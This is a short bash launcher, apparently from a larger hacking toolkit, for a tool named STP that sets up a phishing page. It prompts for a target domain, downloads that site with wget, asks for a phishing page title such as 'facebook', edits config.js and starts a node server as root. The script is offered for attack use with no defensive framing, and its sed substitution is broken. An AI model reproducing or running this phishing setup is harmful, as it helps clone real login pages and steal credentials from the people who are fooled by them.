#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'

cd tools/STP
echo -e "${ORNG}"
figlet -f mini "STP"
echo -e "${NC}"
echo -e "${W}Please enter your target domain: ${NC}"
read DOM
sleep 1
cd files
wget ${DOM}
cd ..
echo -e "${W}Please enter the title of your phishing page"
echo -e "${ORNG}eg. facebook${NC}"
read TITLE
sed -i 's/facebook/${TITLE}/g' config.js
sleep 5
sudo node stp.js

sleep 5
cd ../..
./tiger.sh
